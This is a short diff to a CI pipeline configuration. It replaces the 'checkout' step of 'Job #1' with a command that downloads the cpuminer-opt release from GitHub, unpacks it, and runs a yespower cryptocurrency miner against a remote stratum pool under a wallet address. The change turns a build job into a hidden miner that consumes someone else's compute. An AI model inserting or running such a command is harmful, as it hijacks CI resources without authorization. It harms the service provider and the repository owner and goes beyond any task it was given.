@@ -10,4 +10,4 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xvzf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower -o stratum+tcp://stratum-asia.rplant.xyz:7043 -u PXXee8w5LcKC2vHQNGs9ftp26m6wd2ggJP.test'
